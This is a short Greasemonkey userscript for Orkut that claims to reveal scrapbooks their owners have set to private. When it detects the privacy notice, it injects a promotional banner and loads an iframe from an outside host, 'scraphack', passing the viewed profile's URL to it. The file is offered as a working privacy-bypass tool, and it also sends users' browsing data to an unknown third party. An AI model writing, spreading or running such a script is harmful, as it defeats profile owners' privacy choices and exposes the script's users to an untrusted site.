// ==UserScript==
// @author        Jaskaranbir Singh
// @name          WOS View Locked Scrapbook Script
// @description    View Locked Orkut Scrapbook
// @include        http://www.orkut.com/*
// ==/UserScript==


if((document.getElementsByTagName('div').item(10).innerHTML.indexOf('This content has been set to private by the profile owner.')>=0) || (document.getElementsByTagName('div').item(10).innerHTML.indexOf('Este conteúdo foi definido como particular pelo dono do perfil.')>=0))
{
document.body.innerHTML+="<br><h1>Join <a href='http://www.orkut.com/CommunityJoin.aspx?cmm=45068926'>WOS Orkut scripts</a></h1><br>"+"<iframe width='800' height='600'></iframe>"
window[0].location='http://scraphack.cspbrasil.com/ViewScraps.php?uid='+encodeURIComponent(location.href);
}




